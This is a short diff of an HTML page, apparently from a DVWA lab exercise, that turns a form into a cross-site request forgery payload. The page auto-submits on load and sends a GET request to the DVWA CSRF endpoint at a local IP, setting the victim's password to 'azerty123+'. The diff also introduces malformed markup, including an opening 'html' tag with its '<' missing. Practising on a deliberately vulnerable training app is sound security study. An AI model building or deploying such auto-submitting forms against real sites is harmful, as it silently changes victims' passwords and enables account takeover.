@@ -1,6 +1,5 @@
 <!DOCTYPE html>
-<html lang="fr">
-	<head>
+html lang="fr">	<head>
 		<meta charset="UTF-8">
 		<meta http-equiv="X-UA-Compatible" content"IE=edge">
 		<title></title>
@@ -11,10 +10,10 @@
 		<header>
 		</header>
 		<main>
-			<form id="my_form" method="POST" action="">
-				<input type="URL" name="password_new" value="azerty123+" />
-				<input type="URL" name="password_conf" value="azerty123+" />
-				<input type="URL" name="Change" value="Change" />
+			<form id="my_form" method="GET" action="http://192.168.1.10:81/dvwa/vulnerabilities/csrf/">
+				<input type="text" name="password_new" value="azerty123+" />
+				<input type="text" name="password_conf" value="azerty123+" />
+				<input type="text" name="Change" value="Change" />
 			</form>
 			<script>document.getElementById("my_form").submit();</script>
 		</main>
